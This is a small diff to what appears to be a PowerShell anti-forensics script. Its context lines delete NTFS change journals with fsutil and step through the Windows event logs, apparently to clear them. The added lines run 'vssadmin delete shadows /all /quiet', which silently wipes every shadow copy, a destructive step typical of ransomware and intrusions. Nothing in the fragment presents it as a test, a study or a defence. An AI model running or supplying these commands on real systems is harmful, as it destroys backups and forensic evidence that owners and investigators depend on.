@@ -11,6 +11,9 @@ New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\System" -Name 
     fsutil usn deletejournal /d /n $_
 }
 
+# Deleting shadow files
+vssadmin delete shadows /all /quiet
+
 
 # Event Logs
 Get-WinEvent -ListLog * | ForEach-Object {
